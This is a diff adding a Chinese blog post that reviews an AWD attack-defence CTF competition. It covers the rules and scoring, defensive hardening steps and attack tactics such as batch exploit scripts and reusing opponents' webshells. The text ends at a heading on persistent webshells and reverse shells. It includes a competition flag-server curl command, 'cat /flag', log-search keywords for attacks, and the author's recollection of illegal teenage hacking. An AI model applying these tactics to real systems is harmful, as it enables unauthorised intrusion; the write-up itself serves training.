@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Johnny">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Johnny">
+    
+    <meta name="keywords" content="pwn学习,web安全,awd线下赛">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>个人年度总结及AWD线下赛复盘 · Johnny&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/r0ot-to0r.github.io/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/r0ot-to0r.github.io/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/r0ot-to0r.github.io/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/r0ot-to0r.github.io/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/r0ot-to0r.github.io/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/r0ot-to0r.github.io/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/r0ot-to0r.github.io/" >Johnny&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">个人年度总结及AWD线下赛复盘</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/r0ot-to0r.github.io/>Johnny's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/r0ot-to0r.github.io/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            个人年度总结及AWD线下赛复盘
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">7.6k</span>Reading time: <span class="post-count reading-time">27 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/16</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/r0ot-to0r.github.io/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/r0ot-to0r.github.io/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="个人年度总结及AWD线下赛复盘"><a href="#个人年度总结及AWD线下赛复盘" class="headerlink" title="个人年度总结及AWD线下赛复盘"></a>个人年度总结及AWD线下赛复盘</h1><ul>
+<li>拖了很久，今天记录下第一次参加某全国awd比赛后的一些感想以及学到的些许皮毛知识，<br>也算是对自己自学了小一年的学习成果的检验，防守方面由W.B战队防守队员记录，其他由笔者记录。</li>
+</ul>
+<p><em>开头有一小段水文警告~(不想看可以直接跳到AWD线下赛介绍)</em></p>
+<h2 id="与网安的渊源"><a href="#与网安的渊源" class="headerlink" title="与网安的渊源"></a>与网安的渊源</h2><blockquote>
+<p>记得初中呢会儿，就觉得黑客很酷，自己加了很多qq群，呢个时候差不多是09，10年吧，不知道我玩的时候1433抓鸡算不算过时了。反正呢会儿就是拿着****hacker论坛的1433抓鸡工具，搞个纯真IP库一顿扫，呢会儿算已经玩过葛X写的某鸽子了，呢会儿很费解，不懂为什么马传给对方，自己这里不上线，后来才了解到原来自己所处内网，需要做端口转发，呢个时候还是3322花生域名哈哈哈，做了转发，对方打开才能上线，后来又玩3389端口爆破，直到现在学了网络安全法，才了解到原来这都是违法的！！！到现在还心有余悸。之后初中毕业，反正后面书也没念好。后来只顾着减肥了，也就没继续学下去，也算是一个契机吧，2018年9月有幸考进了这个专业，但是自己之前没有系统学习过，无奈那就从头开始咯，怕什么？反正年纪轻，在学校事情也不多，不多说就是干！虽然一个是脑力一个是体力但是和健身原理一样</p>
+</blockquote>
+<h2 id="需要准备的"><a href="#需要准备的" class="headerlink" title="需要准备的"></a>需要准备的</h2><p><strong>还好有诸位贵人相助(辅导员们，上一届师兄们，学校各位老师以及实习单位师父)，<br>小的也好有条努力的方向，但是时间紧任务重19年5月份就要比赛了，所以学的真的很粗略，后续边实践，边深入~</strong></p>
+<ul>
+<li><p>先大致学习了一下linux系统的常用指令，这个可以看下《Linux就该这么学》，当然想详细了解不怕臃肿的可以看《鸟哥的私房菜》，毕竟是经典中的经典</p>
+</li>
+<li><p>网络工程，至少tcp三次握手要知道，还能看得懂报文。</p>
+</li>
+<li><p>然后学会了上面的linux基本的常用指令，可以开始网上搜寻各种”黑客”的视频，这个别来问我拿自己想办法吧，办法总比困难多，这个时代想学但是没资源，就是TM借口！</p>
+</li>
+<li><p>一套视频认真看完，所谓认真是指1.5倍速播放看一遍，因为会有很多P话，然后重点以及自己记不住的地方记下来，所谓好记性不如烂笔头</p>
+</li>
+<li><p>千万别做收藏党。。。我一开始也是这种SB，导致我5t的网盘都快被我塞爆了，所谓收藏党就是感觉自己转存到网盘，感觉自己吃透了这套课程的全部内容</p>
+</li>
+<li><p>必看书籍：道哥的白帽子讲web安全，反正我到现在都没吃透这本书，但是看书总比你看P*hub要好吧？</p>
+</li>
+<li><p>要会自己搭虚拟机，自己配环境，DVWA这个靶场必须日穿，至少玩到中等难度！</p>
+</li>
+<li><p>最难的来了。Python，对于没有编程基础的人来说，这个语言是最友好的，感恩学校教了些许Java，抱着这一点点基础，结合了“玄魂”大佬的教程，又重新看了天均老哥的公众号“渗透云笔记”，再把这些基础例子敲完，差不多对Python的基础语法有了些许了解</p>
+</li>
+<li><p>后续根据之前学的常见漏洞，加上自学的三脚猫的Python，学习如何写Poc（漏洞验证），以及Exp（漏洞利用）</p>
+</li>
+<li><p>代码审计是王道，php基本的语法学完，能看懂整个一段代码的逻辑，然后跟着审计几套简单的漏洞集合的cms，毕竟php是世界上最好的编程语言（手动滑稽）</p>
+</li>
+</ul>
+<h1 id="AWD线下赛介绍"><a href="#AWD线下赛介绍" class="headerlink" title="AWD线下赛介绍"></a>AWD线下赛介绍</h1><h2 id="赛制和时长："><a href="#赛制和时长：" class="headerlink" title="赛制和时长："></a>赛制和时长：</h2><blockquote>
+<p>竞赛为混战模式，3 人为 1 队。每个队伍环境靶机 2 个，一个靶机为 PWN 考<br>察点，一个靶机含有多个 web 考察点，每 20 分钟为 1 阶段，共 9 个阶段，第 1<br>阶段为准备及加固阶段，第 2 至第 9 阶段为渗透混战阶段。比赛总时长为 3 小时。</p>
+</blockquote>
+<h2 id="竞赛规则"><a href="#竞赛规则" class="headerlink" title="竞赛规则"></a>竞赛规则</h2><ul>
+<li><p>1、参赛选手于比赛正式开始前凭有效证件签到。</p>
+</li>
+<li><p>2、比赛正式开始后迟到 30 分钟者不得进入比赛场地。</p>
+</li>
+<li><p>3、竞赛期间参赛选手不得随意离开竞赛工位。</p>
+</li>
+<li><p>4、参赛选手自带笔记本电脑（自带 RJ45 网口或 USB-RJ45 转接头）、资料(包</p>
+</li>
+<li><p>5、括书籍、电子资料)及移动存储工具。</p>
+</li>
+<li><p>6、比赛过程中发现问题，应当示意裁判组，由裁判组进行解答。</p>
+</li>
+<li><p>7、比赛过程中不允许任何参数选手携带通讯设备，需统一上交进行管理，<br>  不允许任何人通过任何形式进行上网。</p>
+</li>
+<li><p>8、参赛队伍必须保证防守机持续正常运行，保持特定服务或端口处于持续<br>  正常服务状态，对漏洞的修复不得影响服务的正常功能。</p>
+</li>
+<li><p>9、禁止任何对比赛相关平台的暴力破解和攻击，禁止对本平台进行重放数<br>据包攻击，限制频率为 10 次/1 秒，禁止 DDOS、ARP 等干扰比赛正常进行的<br>攻击，禁止任何针对参赛对手的网络攻击行为，违规者一律取消参赛资格并<br>进行公示。</p>
+</li>
+<li><p>10、除参赛选手及大赛赛场工作人员外，其余人员一律不得进入赛场。</p>
+</li>
+<li><p>11、禁止进行限制其他队伍攻击己方防守机的配置，或者限制访问 FLAG 服<br>  务器（例如，修改防守机到 FLAG 服务器的路由等），违规者一律取消参赛<br>资格并进行公示。</p>
+</li>
+<li><p>12、比赛过程中不能相互交流，禁止参赛队伍之间分享任何解题思路及 FLAG，<br>违规者一律取消参赛资格并进行公示。</p>
+</li>
+<li><p>13、比赛中裁判有可能抽查获取得分点的方法，如果发现回答有误，疑似非<br>法渠道获取答案的，取消其该项得分，严重者取消比赛资格并进行公示。</p>
+</li>
+<li><p>14、公平起见，只有当没有任何参赛队伍解出某题的时候，裁判组才可能发<br>放相关提示，解题提示信息请关注竞赛公告。</p>
+</li>
+<li><p>15、竞赛结束（或提前完成）后，参赛选手不得进行任何操作。</p>
+</li>
+<li><p>16、比赛过程中，请服从和配合裁判和现场工作人员的相关安排。</p>
+</li>
+<li><p>17、如有其它违规行为，组委会及裁判组将酌情进行相应的处罚措施。</p>
+</li>
+<li><p>18、其他事项由组委会裁判组在比赛前一天进行公告及通知。</p>
+</li>
+</ul>
+<h2 id="攻防对抗赛评分规则："><a href="#攻防对抗赛评分规则：" class="headerlink" title="攻防对抗赛评分规则："></a>攻防对抗赛评分规则：</h2><blockquote>
+<p>攻防对抗题总得分=初始分值+攻击得分-被攻击失分-服务异常扣分-重置防<br>守机扣分</p>
+</blockquote>
+<ul>
+<li><p>1、攻防对抗题初始分值为 8000 分。</p>
+</li>
+<li><p>2、参赛队伍攻击其他队伍防守机并获得权限后，可访问平台 flag 生成地址</p>
+<p>（curl <a href="http://192.168.100.1/Getkey）获得" target="_blank" rel="noopener">http://192.168.100.1/Getkey）获得</a> flag。</p>
+</li>
+<li><p>3、比赛每 20 分钟为一个阶段，同一阶段内只能提交同一队伍的 flag1 次。</p>
+</li>
+<li><p>4、flag 有效期为 60s，获取后尽快提交。</p>
+</li>
+<li><p>5、flag 提交成功后，渗透成功 1 个靶机得分 5 分，2 个靶机得分 10 分。</p>
+</li>
+<li><p>6、check 机制定时对所有防守机进行探测，探测业务可用性，服务可用性。<br>每轮次比赛，最多扣 400 分（防守机任意应用服务异常，则触发扣分机制，<br>比赛平台答题页面会实时提醒防守机异常状态）</p>
+</li>
+<li><p>7、参赛队伍可请求裁判重置本方防守机，每重置一个虚拟机，扣除 50 分（注<br>意：重置后，之前所有的加固策略及攻击方的后门皆失效，所以防守机恢复<br>到初始状态）。</p>
+</li>
+</ul>
+<h2 id="团队分工"><a href="#团队分工" class="headerlink" title="团队分工"></a>团队分工</h2><ul>
+<li>基本上都是3人为一组，纯web组两人攻击一人防守，如果有pwn手的话，web一攻一防，pwn一个人</li>
+</ul>
+<h2 id="防御篇"><a href="#防御篇" class="headerlink" title="防御篇"></a>防御篇</h2><h3 id="一、AWD防守队员需具备的基础知识和防御关注方向："><a href="#一、AWD防守队员需具备的基础知识和防御关注方向：" class="headerlink" title="一、AWD防守队员需具备的基础知识和防御关注方向："></a>一、AWD防守队员需具备的基础知识和防御关注方向：</h3><ul>
+<li><p>前期需要对于php、sql、html、css、python等语言有基础知识，最好能做到看得懂，分析得 了，建议掌握一门python语言以便脚本的编写，在防御方面python脚本编写也可以实现一系列的自动化，这个后面会详细阐述。</p>
+</li>
+<li><p>对tcp/ip协议、http、https需要有所了解。网络攻防，是架构在网络上的，我们的队员要知道网络是如何通讯的，三次握手、四次挥手。</p>
+</li>
+<li><p>由于awd比赛很多都是lamp环境下的（linux、apache、mysql、PHP）所以熟练的使用linux系统基本命令也是很重要的，对于bash脚本编写也是需要知晓的。</p>
+</li>
+<li><p>由于AWD比赛时间较短节奏较为紧张，为了达到比赛的观赏性，主办方提供的cms源码中都会预置漏洞，主要出现的就是源码中预留的webshell、典型的文件上传漏洞、后台弱口令（这个是真实渗透中最容易出问题的地方，虽然对于awd来说对拿到shell权限帮助不是很明显）、passthru（）函数利用、还有目录穿越漏洞、sql注入上述是经常在awd比赛中出现的，也是我们防守队员需要关注的点。</p>
+</li>
+<li><p>除此之外，我还建议各位防守队员自己能经常搭建各种cms，手里多留几套cms，一旦比赛遇到可以用BeyondCompare工具对比分析，还可以对比cms的漏洞，比自己比赛场上挖洞还是效率很多的，自己留有cms也可以在源码找不到的时候利用find命令查询到源码位置，在19年8月的决赛中就遇到有一套cms在/usr/share/nginx/html里，我就是利用自己提前准备的cms对比查询，给团队第一时间找到了预留webshell，稳固了团队的排名。</p>
+</li>
+</ul>
+<h3 id="二、防守流程详解："><a href="#二、防守流程详解：" class="headerlink" title="二、防守流程详解："></a>二、防守流程详解：</h3><ul>
+<li><p>连接ssh，这里建议使用mobaXterm，集ssh和ftp工具于一体的神仙工具。连接完ssh，如果发现是弱口令或者统一的口令，应当立刻修改ssh密码。笔者于2019年6月的初赛中就在此处吃了亏，修改ssh密码的速度比不过脚本，比赛前两个小时等于盲打，惨痛的教训啊，划重点！！！</p>
+</li>
+<li><p>打包源码，我个人习惯是利用tar -zcvf xxx.tar.gz /路径，源码备份一是可以分析源码找木马，二是可以做备份谨防被人删库导致down机持续被check扣分。</p>
+</li>
+<li><p>把源码download至本地，解压后，拖进D盾进行扫描（这一步360也可以扫，甚至会爆出更多疑似后门文件），这一步既能作为查找官方预留webshell的方法，也可以做后期攻击分析无奈时的最原始的暴力方法（遇到不是写一句话木马的就无效了）。</p>
+</li>
+<li><p>数据库备份也必不可少，这一步要先看数据库配置文件，对于我们这套cms的数据库名、数据库账号、数据库密码，然后利用mysqldump的语句进行备份。这一步是为了防止被人删除或者修改数据库内容导致网页不能正常使用，被check机制扣分。<br>数据库进入以后可以查看后台密码，这个大概率是全场一样的弱口令，你也可以在web上扫描后台然后进入后弱口令尝试，登陆后修改密码。也可以提前准备好，根据加密方式的不同的hash，基本上是一段mysql的hash，然后你替换掉，密码就修改成你准备好的了。</p>
+</li>
+<li><p>按照我的习惯，这一步是先在upload目录下，上传一个文件监控脚本，然后命令行cd /路径/，然后ls看一下，然后python linux.py，这边所有上传的文件都会被移位和改名了，这里要注意权限，有时候会有外部访问的权限，我们就手动的给这个文件夹chmod 600一下就好了。</p>
+</li>
+<li><p>这一步我推荐安装一下weblogger-master脚本，具体安装方法github有，源码也在github上。这个脚本呢是进行ip记录和分析的，对于流量分析来说极为重要，可以把攻击溯源。<br>还建议大家再准备一个写日志的php，我这里使用logger.php，网上有很多类似的logger可以尝试一下并使用。在生成的日志里，可以对于关键字搜索，就可以知道大佬是怎么从你这里得分的，可以骑马上马利用一波大佬的马，也可以学大佬一样利用漏洞，这里建议分析完交给攻击队友，你的任务还是防御，要第一时间把洞补掉。</p>
+</li>
+<li><p>在linux环境下，要注意权限的管理，对于给定情况，可以赋予644、755权限，自己用的工具要给755，给web用户的给644权限。这里也解释一下644、755，644代表所有者有读取、写入权限、同组用户和其他用户仅有读取权限，755代表所有者有执行、写入、读取权限、同组用户和其他用户有读取、执行权限。</p>
+</li>
+<li><p>防守队员也可以通过使用这条命令find /var/www/html -exec touch -c -m -t 202201110000 {} ;     来实现对于/var/www/html路径下的源码进行批量修改未来时间，在mobaxterm左边的界面就可以清晰的看到，哪些文件有时间变化，这里的路径只是针对大多数常规源码，在蓝帽杯决赛中，其中web服务器中有三套cms，对于第二套cms的源码就不是这个位置，在/usr/share/nginx/html，像wordpress搭建的网站，web目录、后台也不太一样，利用御剑还需要导入不一样的字典，wordpress的后台如果没有修改过的话应该是<a href="http://site/wp-admin" target="_blank" rel="noopener">http://site/wp-admin</a></p>
+</li>
+<li><p>防守队员需要多关注比赛分数变化，一旦被扣分，就可以查看文件时间有异样的目录进行分析，也可以在自己写的log文件中进行搜索关键字如（flag、cat、curl），一旦分析出攻击方法便可提供给队友，再分析流量便可知道是哪个ip攻击的我方服务器。这里的分析分为几种情况，要分情况进行决策。 </p>
+</li>
+</ul>
+<h3 id="三、关于被攻击后如何加固防护并加以利用："><a href="#三、关于被攻击后如何加固防护并加以利用：" class="headerlink" title="三、关于被攻击后如何加固防护并加以利用："></a>三、关于被攻击后如何加固防护并加以利用：</h3><ul>
+<li><p>发现攻击方通过webshell进行攻击的，需要迅速定位webshell文件先下载到本地随后将服务器上的迅速删除，分析该webshell，最好能做到利用该攻方大佬偷袭一波全场。</p>
+</li>
+<li><p>如果是发现有文件有shell执行权限，应当进行修改，把shell执行的地方进行删除并require_once(‘/waf的路径/waf.php’);这里的waf建议准备几个各种强度的，因为比赛中check机制不同，通过上waf进行测试，如果没有被check扣分就继续使用，如果扣分了就强度减弱。</p>
+</li>
+<li><p>如果发现是文件上传漏洞进来的，虽然我们有linux.py文件上传监控脚本，但是也不排除它能够成功执行，这时候可以测试upload.php删掉是否会被check，可以选择直接把upload.php删除，在web上，像上传这类操作执行都会有一个php来进行解析执行，所以一旦没有这个php外部就没有办法进行上传操作。不仅要自己防御，这时候还要告诉负责攻击的队友进行利用上传漏洞，或者利用他们上传好的马进行骑马上马偷分打全场。</p>
+</li>
+<li><p>如果发现是利用passthru方法获取flag的，也可以利用搜索我们自己脚本写的log文件进行search，查询到关键字的位置，进行溯源分析。</p>
+</li>
+<li><p>一旦发现有../../目录穿越的方法，可以选择进行权限修改600，并上传waf进行防护，关于waf被check扣分前面已经阐述了方法。</p>
+</li>
+<li><p>我还在比赛中见过从数据库中写入进行cat /flag的，这里首先需要有后台权限，我们当时是后台密码被人修改了，他从后台往数据库里写入进行执行的，这时候就可以立马通过ssh工具界面进行mysql后台密码hash更换的方法进行修改后台密码，这时候要注意很多攻击方法都是批量（或者手动一个个打过来），攻方并不会针对你一个，他的目的是得分，所以很多人那边他都会进行一样的操作。</p>
+</li>
+<li><p>还有sql注入漏洞，sqlmap可以利用sql注入跑出很多信息，所以在sql注入点，可以通过删除搜索所使用的php（注意别被check扣分），如果扣分则可以选择进行require、include包含一下waf进行软waf防护。</p>
+</li>
+</ul>
+<h3 id="防御后记："><a href="#防御后记：" class="headerlink" title="防御后记："></a>防御后记：</h3><blockquote>
+<p>最后就是在awd比赛中瞬息万变，防御篇冗长但也不能囊括所有可能遇到的突发状况，所以我建议把基础知识和防御关注方向这边了解深入，从基础着手，以不变应万变，只有有着良好的基础才能更好地进行突发情况处理。不仅要有良好的基础，较多的实际操作也至关重要，像ctf给我最深的感受就是看一百遍不如做一遍，编程也是一样，自己编和啃书啃博客完全不能比拟，基础知识很重要，但是实践也很重要，你找一个网络通信基础扎实的理论派，真面对问题他也只能分析，可能到头来连burp都用不来。空学费时，实践才能牢牢掌握ctf技能。本文只是我的一些理解，可能存在不准确的地方，往大佬能指出，分享也是一种进步，Open、Free、Share才是真·黑客精神。</p>
+</blockquote>
+<ul>
+<li>防御篇由W.B战队防守队员撰写</li>
+</ul>
+<h2 id="攻击篇"><a href="#攻击篇" class="headerlink" title="攻击篇"></a>攻击篇</h2><ul>
+<li><p>准备批量改ssh弱口令脚本，毕竟还是会有想法很简单的主办方设置这个作为考点</p>
+</li>
+<li><p>登陆flag提交平台burp抓包，对应burp抓到的报文信息，写批量提交flag的脚本</p>
+</li>
+<li><p>拿到源代码，代码审计放进去一把梭，别管呢么多~</p>
+</li>
+<li><p>这里就提到之前为什么让大家收集更多的cms的poc了，因为这种大型比赛基本上都是之前比较经典的cms环境+主办方自己魔改的漏洞点+预留后门 </p>
+</li>
+<li><p>源代码顺便放D盾，扫一波预留后门，因为awd的比赛环境是每个都一样的，放的预留webshell路径也是一样的，这步可以让防御的兄弟做，扫出来直接把路径报给你，这样你只需要专注写批量EXP就完事了</p>
+</li>
+<li><p>黑盒测试，对常见的功能点进行测试，比如：注册，登陆后是否有头像上传处，找各种上传点。搜索框等，测试是否存在sql注入，万能密码，是否存在命令执行，代码执行等等….</p>
+</li>
+<li><p>找到漏洞点，直接用python写批量exp，这就涉及到前面提到的python基础了，别特么说不会，不会就死磕，干就完了，之后我也会写一篇，关于如何在比赛中高效针对poc写批量exp</p>
+</li>
+<li><p>准备些提前写好的脚本，这些GitHub上都能搜，自己找自己测试，不要觉得麻烦，这是必经之路，我也不可能给你讲解别人写的脚本。我给的肯定没有你自己找来测试的好用</p>
+</li>
+<li><p>对于小白，个人建议和防守的童鞋多沟通，因为还是有大佬的存在，让防守的同学做好流量分析，文件监控分析，比如别人打进来的流量，可以直接写exp利用，别人打进来的马，可以直接用工具爆破密码或者看明文，骑马上马，进行反攻！ </p>
+</li>
+</ul>
+<blockquote>
+<p>攻击后记：只要还是对漏洞的原理理解，以及快速定位各功能的漏洞点，重中之重还是快速编写EXP的能力，编程是基础，也是王道！</p>
+</blockquote>
+<h2 id="权限维持篇"><a href="#权限维持篇" class="headerlink" title="权限维持篇"></a>权限维持篇</h2><p><strong>主要有两种，一种是“不死马”，另一种是反弹shell</strong></p>
+<p><strong>“不死马”</strong></p>
